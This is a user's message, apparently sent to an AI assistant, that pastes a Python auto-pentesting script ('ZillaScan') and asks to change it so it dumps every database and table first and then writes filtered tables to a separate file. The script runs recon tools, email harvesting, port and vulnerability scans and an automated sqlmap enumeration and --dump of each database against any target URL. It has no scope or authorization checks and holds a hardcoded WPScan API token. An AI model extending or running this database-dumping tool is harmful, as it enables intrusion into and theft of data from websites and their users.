that didnt work. i will attach the script that found the databases . i want to keep it like that was but i need it to dump the databases and tables FIRST , and THEN filter out the tables as requested and provide another dump file of the contents of the tables i wanted to filter.  #!/usr/bin/env python3

import sys
import subprocess
import os
import re
import json
from urllib.parse import urlparse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import shutil
from threading import Lock

# ---------------- Global Setup ----------------
TIMESTAMP = datetime.now().strftime("%Y%m%d_%H%M%S")
OUTPUT_FILES = []  # Keep track of all files generated during the scan
SUMMARY_LOCK = Lock()  # Thread-safe lock for writing to shared resources
REPORT_DATA = {"subdomains": set(), "directories": set(), "vulnerabilities": [], "sqlmap": {}}
ENABLE_WPSCAN_BRUTEFORCE = False  # WPScan brute-force is disabled by default

# ---------------- Banner ----------------
def banner():
    """Display the ASCII banner when the script starts"""
    print(r"""
__________.__.__  .__           _________                     
\____    /|__|  |  | _____   /   _____/ ____ _____    ____  
  /     / |  |  | |  | \__  \  \_____  \_/ ___\\__  \  /    \ 
 /     /_ |  |  |_|  |__/ __ \_/        \  \___ / __ \|   |  \
/_______ \|__|____/____(____  /_______  /\___  >____  /___|  /
        \/                  \/        \/     \/     \/     \/ v1.337

        Auto Pentesting Script
      Created by Hackazillarex 🐉
       Hackazillarex@gmail.com
    """)

# ---------------- Check Dependencies ----------------
def check_dependencies(tools):
    """Ensure all required command-line tools are installed before starting"""
    missing = [tool for tool in tools if shutil.which(tool) is None]
    if missing:
        print(f"[!] Missing dependencies: {', '.join(missing)}. Please install them first.")
        sys.exit(1)

# ---------------- Run Shell Command ----------------
def run(cmd, desc, outfile=None, live_output=True):
    """
    Execute a shell command.
    - live_output=True prints output as it runs.
    - Saves output to file if outfile is provided.
    - Returns command output as string.
    """
    try:
        print(f"\n[+] {desc}\n{'='*60}")
        output = ""
        if live_output:
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            output_lines = []
            for raw_line in process.stdout:
                line = raw_line.decode("utf-8", errors="ignore")
                print(line, end="")
                output_lines.append(line)
            process.wait()
            output = "".join(output_lines)
        else:
            result = subprocess.run(cmd, shell=True, capture_output=True)
            output = result.stdout.decode("utf-8", errors="ignore") + result.stderr.decode("utf-8", errors="ignore")
            print(output)

        if outfile and live_output:
            with open(outfile, "w", errors="ignore") as f:
                f.write(output)
            with SUMMARY_LOCK:
                OUTPUT_FILES.append((desc, outfile))
        return output
    except Exception as e:
        print(f"[!] {desc} failed: {e}")
        if outfile:
            with SUMMARY_LOCK:
                OUTPUT_FILES.append((f"{desc} (FAILED)", outfile))
        return ""

# ---------------- Helper Functions ----------------
def extract_domain(url):
    """Extract domain or host from a URL"""
    parsed = urlparse(url)
    return parsed.netloc or parsed.path

def get_root_domain(url):
    """Get the root domain (e.g., example.com from sub.example.com)"""
    domain = extract_domain(url)
    parts = domain.split(".")
    if len(parts) >= 2:
        return ".".join(parts[-2:])
    return domain

def clean_subdomains(file_path):
    """
    Filter valid subdomains and remove duplicates.
    Regex explained:
    - ^ → start of line
    - (?:[a-zA-Z0-9-]+\\.)+ → one or more groups of letters/numbers/dashes followed by a dot
    - [a-zA-Z]{2,} → TLD with at least 2 letters
    - $ → end of line
    """
    valid_subdomain_regex = re.compile(r"^(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$")
    cleaned = set()
    with open(file_path, "r", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if valid_subdomain_regex.match(line):
                cleaned.add(line.lower())
    with open(file_path, "w") as f:
        for sub in sorted(cleaned):
            f.write(sub + "\n")
    print(f"[+] Cleaned subdomains saved: {file_path}")
    with SUMMARY_LOCK:
        OUTPUT_FILES.append(("Cleaned subdomains", file_path))
    REPORT_DATA["subdomains"].update(cleaned)

# ---------------- Tool Wrappers ----------------
def run_ffuf(target, output_dir):
    """Perform subdomain fuzzing using FFUF and save results"""
    root_domain = get_root_domain(target)
    ffuf_json_file = f"{output_dir}/ffuf_subdomains_{TIMESTAMP}.json"
    ffuf_txt_file  = f"{output_dir}/ffuf_subdomains_{TIMESTAMP}.txt"
    ffuf_wordlist  = "/usr/share/wordlists/dirb/common.txt"

    cmd = f"ffuf -u http://FUZZ.{root_domain} -w {ffuf_wordlist} -t 40 -mc 200,301,302 -o {ffuf_json_file} -of json"
    run(cmd, "Subdomain Fuzzing (FFUF)", outfile=None, live_output=False)

    # Parse JSON output and save to TXT file
    try:
        with open(ffuf_json_file, "r", errors="ignore") as f:
            data = json.load(f)
        subdomains = set()
        for result in data.get("results", []):
            host = result.get("host")
            if host:
                subdomains.add(host.lower())
        with open(ffuf_txt_file, "w") as f:
            for sub in sorted(subdomains):
                f.write(sub + "\n")
        REPORT_DATA["subdomains"].update(subdomains)
        with SUMMARY_LOCK:
            OUTPUT_FILES.append(("FFUF JSON Subdomains", ffuf_json_file))
            OUTPUT_FILES.append(("FFUF TXT Subdomains", ffuf_txt_file))
    except Exception as e:
        print(f"[!] FFUF parsing failed: {e}")

def run_gobuster(target, output_dir):
    """Scan directories on the target using Gobuster"""
    gobuster_file = f"{output_dir}/gobuster_{TIMESTAMP}.txt"
    cmd = f"gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -t 40 -b 404,403 -o {gobuster_file}"
    run(cmd, "Directory Brute-Force (Gobuster)", outfile=None, live_output=False)

    # Extract valid directories: lines starting with '/'
    try:
        with open(gobuster_file, "r", errors="ignore") as f:
            for line in f:
                if line.startswith("/"):
                    REPORT_DATA["directories"].add(line.strip())
        with SUMMARY_LOCK:
            OUTPUT_FILES.append(("Directory Brute-Force (Gobuster)", gobuster_file))
    except Exception as e:
        print(f"[!] Gobuster parsing failed: {e}")

def run_nuclei_scan(target, output_dir):
    """High-severity vulnerability scan using Nuclei"""
    output_file = f"{output_dir}/nuclei_{TIMESTAMP}.txt"
    cmd = f"nuclei -u {target} -severity high,critical -v -o {output_file}"
    run(cmd, "Vulnerability Scan (Nuclei)", outfile=None, live_output=False)

    # If file is empty, mark scan as completed with no issues
    if not os.path.exists(output_file) or os.path.getsize(output_file) == 0:
        with open(output_file, "w") as f:
            f.write("[i] Nuclei completed: No issues found.\n")
    with SUMMARY_LOCK:
        OUTPUT_FILES.append(("Vulnerability Scan (Nuclei)", output_file))

def run_whatweb(target, output_dir):
    """Detect technologies used on the target website"""
    whatweb_file = f"{output_dir}/whatweb_{TIMESTAMP}.txt"
    cmd = f"whatweb {target} -v > {whatweb_file}"
    run(cmd, "Web Fingerprinting (WhatWeb)", outfile=None, live_output=False)
    with SUMMARY_LOCK:
        OUTPUT_FILES.append(("Web Fingerprinting (WhatWeb)", whatweb_file))

def run_sqlmap(target, output_dir):
    """Automate SQL injection discovery and dumping using SQLMap"""
    base_dir = f"{output_dir}/sqlmap_{TIMESTAMP}"
    os.makedirs(base_dir, exist_ok=True)

    # Enumerate all databases
    enum_cmd = f"sqlmap -u {target} --batch --level=2 --risk=2 --crawl=2 --threads=10 --random-agent --dbs --output-dir={base_dir}"
    run(enum_cmd, "SQLMap Database Enumeration", outfile=None, live_output=True)

    # Collect database names from .sqlite files
    dbs = []
    for root, dirs, files in os.walk(base_dir):
        for file in files:
            if file.endswith(".sqlite"):
                db_name = file.replace(".sqlite", "")
                dbs.append(db_name)
    REPORT_DATA["sqlmap"]["databases"] = dbs

    # Dump each database
    for db in dbs:
        dump_file = f"{base_dir}/dump_{db}.txt"
        dump_cmd = f"sqlmap -u {target} --batch --level=2 --risk=2 --crawl=2 --threads=10 --random-agent -D {db} --dump --output-dir={base_dir} > {dump_file}"
        run(dump_cmd, f"SQLMap Dump Database: {db}", outfile=None, live_output=True)
        with SUMMARY_LOCK:
            OUTPUT_FILES.append((f"SQLMap Dump: {db}", dump_file))

def run_wpscan(target, output_dir):
    """Scan WordPress sites for vulnerabilities using WPScan"""
    output_file = f"{output_dir}/wpscan_report_{TIMESTAMP}.txt"
    cmd = (
        f"wpscan --url {target} "
        f"--enumerate u,t,p --plugins-detection mixed "
        f"--random-user-agent "
        f"--disable-tls-checks "
        f"--ignore-main-redirect "
        f"--format cli "
        f"--output {output_file} "
        f"--api-token ftxD76Ire0dxcOkj8NPMQjtqEjnqaBOXVLxPOT6hiVw"
    )
    run(cmd, "WPScan Vulnerability Scan", outfile=None, live_output=False)

    # Parse WPScan output: only keep vulnerabilities ([!] or informational [i])
    try:
        with open(output_file, "r", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and ("[!] " in line or "[i] " in line):
                    REPORT_DATA["vulnerabilities"].append(line)
    except Exception as e:
        print(f"[!] WPScan parsing failed: {e}")
    with SUMMARY_LOCK:
        OUTPUT_FILES.append(("WPScan Vulnerability Scan", output_file))

# ---------------- Main Execution ----------------
def main():
    if len(sys.argv) != 2:
        print("Usage: python3 ZillaScan.py https://target.com")
        sys.exit(1)

    banner()
    target = sys.argv[1]
    domain = extract_domain(target)
    output_dir = f"output_{domain}"
    os.makedirs(output_dir, exist_ok=True)

    # ---------------- Ensure tools are available ----------------
    tools = ["dig", "subfinder", "theHarvester", "nmap", "ncat", "ffuf", "gobuster", "nuclei", "whatweb", "sqlmap", "wpscan"]
    check_dependencies(tools)

    # ---------------- Serial Recon Tasks ----------------
    run(f"dig {domain} any @8.8.8.8", "DNS Records (dig)", outfile=f"{output_dir}/dig_{TIMESTAMP}.txt")
    subfinder_file = f"{output_dir}/subdomains_{TIMESTAMP}.txt"
    run(f"subfinder -d {domain} -silent", "Subdomain Enumeration (Subfinder)", outfile=subfinder_file)
    clean_subdomains(subfinder_file)

    # ---------------- Email/Host Recon ----------------
    harvester_raw_file = f"{output_dir}/harvester_{TIMESTAMP}.txt"
    run(f"theHarvester -d {domain} -b bing,duckduckgo,yahoo,crtsh,bufferoverun",
        "Email/Host Recon (theHarvester)", outfile=harvester_raw_file)

    # Extract emails and hosts with regex
    hosts, emails = set(), set()
    email_regex = re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-z]{2,}")
    subdomain_regex = re.compile(r"^(?:[a-zA-Z0-9-]+\\.)+[a-zA-Z]{2,}$")
    with open(harvester_raw_file, "r", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if subdomain_regex.match(line):
                hosts.add(line.lower())
            elif email_regex.match(line):
                emails.add(line.lower())

    # Save cleaned host/email lists
    harvester_hosts_file = f"{output_dir}/harvester_hosts_{TIMESTAMP}.txt"
    harvester_emails_file = f"{output_dir}/harvester_emails_{TIMESTAMP}.txt"
    with open(harvester_hosts_file, "w") as f:
        for h in sorted(hosts):
            f.write(h + "\n")
    with open(harvester_emails_file, "w") as f:
        for e in sorted(emails):
            f.write(e + "\n")
    OUTPUT_FILES.extend([
        ("Harvester hosts", harvester_hosts_file),
        ("Harvester emails", harvester_emails_file)
    ])

    # ---------------- Parallel Scanning Tasks ----------------
    tasks = [
        ("Full Port and Service Scan (Nmap)", lambda: run(f"nmap -sC -sV -T4 -A -p- {domain}",
                                                           "Full Port and Service Scan (Nmap)",
                                                           f"{output_dir}/nmap_{TIMESTAMP}.txt")),
        ("Ncat Banner Grab", lambda: [run(f"echo '' | ncat {domain} {port} -w 3",
                                          f"Ncat Banner Grab Port {port}",
                                          f"{output_dir}/ncat_{port}_{TIMESTAMP}.txt") for port in [21,22,25,80,110,143,443,3306,8080]]),
        ("FFUF Subdomain Fuzzing", lambda: run_ffuf(target, output_dir)),
        ("Gobuster Directory Scan", lambda: run_gobuster(target, output_dir)),
        ("Nuclei Scan", lambda: run_nuclei_scan(target, output_dir)),
        ("WhatWeb Fingerprinting", lambda: run_whatweb(target, output_dir)),
        ("SQLMap Injection Scan", lambda: run_sqlmap(target, output_dir)),
        ("WPScan Vulnerability Scan", lambda: run_wpscan(target, output_dir))
    ]

    # Run tasks concurrently
    with ThreadPoolExecutor(max_workers=6) as executor:
        futures = {executor.submit(func): name for name, func in tasks}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"[!] {futures[future]} failed: {e}")

    # ---------------- Write Summary ----------------
    summary_file = f"{output_dir}/summary_{TIMESTAMP}.txt"
    with open(summary_file, "w") as f:
        f.write("==== ZillaScan Summary ====\n")
        f.write(f"Target: {target}\nDomain: {domain}\nTimestamp: {TIMESTAMP}\n\n")
        for desc, path in OUTPUT_FILES:
            f.write(f"[{desc}] -> {path}\n")

    # ---------------- Save JSON Report ----------------
    json_safe_data = {k: list(v) if isinstance(v, set) else v for k, v in REPORT_DATA.items()}
    json_report_file = f"{output_dir}/report_{TIMESTAMP}.json"
    with open(json_report_file, "w") as f:
        json.dump(json_safe_data, f, indent=2)

    print(f"\n[+] ZillaScan Complete. All output saved in: {output_dir}")
    print(f"[+] Master summary file: {summary_file}")
    print(f"[+] Combined JSON report: {json_report_file}")

if __name__ == "__main__":
    main()
